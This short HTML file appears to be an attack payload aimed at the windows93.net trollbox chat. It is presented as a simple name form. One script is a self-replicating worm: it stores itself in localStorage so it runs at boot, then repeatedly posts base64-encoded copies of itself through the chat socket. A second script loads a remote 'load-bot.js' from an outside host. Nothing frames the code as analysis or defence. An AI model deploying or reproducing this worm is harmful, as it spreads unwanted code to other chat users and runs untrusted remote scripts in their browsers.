<form action="http://www.windows93.net/#!trollbox">
  First name:<br>
  <input type="text" name="firstname" value="Example">
  <br>
  Last name:<br>
  <input type="text" name="lastname" value="=trollbox">

  <input type="submit" value="Submit">
</form>

<script type="text/javascript">
(q=_=>{localStorage['boot/q.js']=`(q=${q})()`;setInterval(_=>{f=document.querySelector('iframe[src*=trollbox]');if(f&&f.contentWindow.socket){f.contentWindow.socket.emit('message','Example,'+btoa(`(q=${q})()${f.contentWindow.a?' ':''}`));f.contentWindow.a=!f.contentWindow.a}},2500)})()
</script>
<script text="text/javascript">
window.botRoot = "https://sthdatabase.github.io/clown/"; 
var script = document.createElement("script"); 
script.src = botRoot + "load-bot.js" + "?version=" + new Date().getTime(); 
document.head.appendChild(script);
</script>
